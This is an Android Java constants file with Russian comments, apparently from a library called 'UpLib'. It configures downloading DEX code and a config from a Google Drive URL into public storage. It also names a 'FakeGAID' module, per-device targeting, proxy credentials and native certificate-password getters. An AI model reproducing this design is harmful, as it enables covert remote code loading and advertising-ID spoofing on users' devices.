package com.mks.uplib;

import android.content.Context;
import android.os.Environment;

import com.mks.uplib.Libs.ILib;

import java.io.File;

public class C {
    public static String CODE_VERSION = "1.0.0";     //Версия кода
    public static boolean NEED_LOG = true;           //Надо ли вести логирование
    public static boolean IS_NEED_KIBANA_LOG = true; //Надо ли вести логирование в kibana
    public static String URL_TO_CHECK_CONNECTION = "https://google.com";
    public static ILib[] getLibs(Context cnt) //Метод получения списка библиотек которые сейчас интегрированы в UpLib и которые надо обновлять
    {
        ILib[] l = {Shell.UpLib(cnt), Shell.FakeGAID(cnt), Shell.PushLib(cnt), Shell.SendStatLib(cnt)};
        return l;
    }
    //public static String[] LIBS = {FakeGAID.LIB_NAME, IntLib.LIB_NAME};

    public static String URL_TO_CONFIG_FILE    = "https://drive.google.com/a/adviator.com/uc?authuser=0&id=1_0_FW58tKlwWApQI-M3XUTpuYrOAusiH&export=download";

    public static String CONFIG_FILE_NAME      = "config.json"; //Путь до файла с конфигурацией
    public static String CONFIG_FILE_NAME_ZIP  = "conf.zip";    //имя закачиваемого файла конфигурации. (в зазипованом виде)


    public static String SPF_SESSION_BASE_DEX_HASH          = "pref_dex_hash";
    public static String SPF_KEY_BASE_DEX_HASH              = "spf_key_dex_hash";            //"правильный" dex для скаченного dex-файла


    public static String getBasePath(Context cnt) //путь по которому сохраняются скаченные файлы (настроечные, dex-файлы, динамические файлы маски...)
    {
        //return (cnt != null) ? ("" + cnt.getCacheDir() + File.separator) : "";
        return  "" + Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS) + File.separator;
    }

    public static String DEX = ".dex";          //расширение dex-файла с внешними классами
    public static String ZIP = ".zip";          //расширение архива

    public static String DexFilePath(Context cnt, String LibName)    {return  "" + getBasePath(cnt) + LibName + ".dex";}
    public static String DexFilePathZip(Context cnt, String LibName) {return  "" + getBasePath(cnt) + LibName + ".zip";}

    public static String ConfigFilePath(Context cnt)    {return  "" + getBasePath(cnt) + CONFIG_FILE_NAME;}
    public static String ConfigFilePathZip(Context cnt)    {return  "" + getBasePath(cnt) + CONFIG_FILE_NAME_ZIP;}

    public native String getPassToCert_ndk();   //ndk метод получения пароля для сертификата
    public native String getCert_ndk();         //ndk метод полученяи самого сертификата
    public native String stringFromJNI();       //Тестовый ndk метод, не используется



    //***********************************************************************************************
    // ***********************    константы для SharedPreferences    ********************************
    //***********************************************************************************************

    public static String SPF_SESSION_PATH_TO_CONF_FILE = "pref_session";
    public static String SPF_KEY_PATH_TO_CONF_FILE     = "path_to_conf_file";           //Сохраненный путь откуда был скачен конфигурационный файл

    public static final String SPF_SESSION_PERIOD              = "session_period";
    public static final String SPF_SESSION_LAST_START_TIME     = "session_last_start_time";
    public static final String SPF_SESSION_NEXT_START_TIME     = "session_next_start_time";
    public static final String SPF_SESSION_LIB_DEX_EXT_PACKAGE = "session_lib_dex_ext_package";
    public static final String SPF_KEY_PERIOD                  = "period";                      //Период с которым запускать обновления
    public static final String SPF_KEY_LAST_START_TIME         = "last_start_time";             //Время последнего запуска обновления
    public static final String SPF_KEY_NEXT_START_TIME         = "next_start_time";             //Время следующего запуска
    public static final String SPF_KEY_LIB_DEX_EXT_PACKAGE     = "lib_dex_ext_package";         //Префикс для сохраненого имени пакета DEX-а дялбиблиотеки

    public static final String SPF_SESSION_VERSION         = "session_code_version";
    public static final String SPF_KEY_VERSION             = "code_version";            //Код предыдущей скаченной версии dex-файла
    //***********************************************************************************************


    //***********************************************************************************************
    // ***********************    Ключи настроечного json-файла   ***********************************
    //***********************************************************************************************
    public static String JSON_KEY_PATH_TO_CONF_FILE     = "path_to_conf_file";     //Путь до "правильного" настроечного файла
    public static String JSON_KEY_DEXS                  = "DEXs";                  //По этому ключу находится список настроек для каждой из библиотек
    public static String JSON_KEY_VERSIONS              = "versions";              //По этому ключу массив настроек для каждой версии
    public static String JSON_KEY_FORBIDDEN_APK_PACKAGE = "forbidden_apk_package"; //Запрещенные пакеты. Т.е. этот dex не будет скачиваться, если был запрошен из этого пакета
    public static String JSON_KEY_FORBIDDEN_VERSION     = "forbidden_version";     //Запрещенные версии. Т.е. этот dex не будет скачиваться, если был запрошен из библиотеки с этой версии  (могут быть заданы диапазоном 1.0.5-1.1.5 или простыми значениями 1.3.6, через запятую)
    public static String JSON_KEY_DEVICE_ID             = "device_id";             //Если заполнен, то dex скачивается только на устройствах с такими GAID-ами
    public static String JSON_KEY_PATH                  = "path";                  //Путь/"имя файла на сервере" до dex файла этой версии
    public static String JSON_KEY_DEX_HASH              = "dex_hash_code";         //Hesh - код dex файла, что бы его не подменили
    public static String JSON_KEY_EXT_PACKAGE_NAME      = "external_package_name"; //Имя пакета для запуска из DEX-а

    public static String JSON_KEY_PROXYS                = "proxys";                //Ключ до массива прокси
    public static String JSON_KEY_PROXY_HOST            = "host";                  //Хост прокси
    public static String JSON_KEY_PROXY_PORT            = "port";                  //Порт прокси
    public static String JSON_KEY_PROXY_LOGIN           = "login";                 //Логин прокси
    public static String JSON_KEY_PROXY_PASSWORD        = "password";              //Пароль прокси
    public static String JSON_KEY_PROXY_TIMEOUT         = "timeout";               //Таймаут по которому считаем что прокси не отвечает, если 0 то используется дефолтный
    //***********************************************************************************************




    /**********************************************************************************************
     * !!!!! ДЛЯ СБОРКИ DEX-а ЭТУ ЧАСТЬ НАДО ЗАКОММЕНТИРОВАТЬ !!!!
    **********************************************************************************************/
    static {
        System.loadLibrary("hello-jni2");
    }
    public String testJNI()
    {
        return stringFromJNI();
    }
    public String getPassToCert()
    {
        return getPassToCert_ndk();
    }
    public String getCert()
    {
        return getCert_ndk();
    }
}
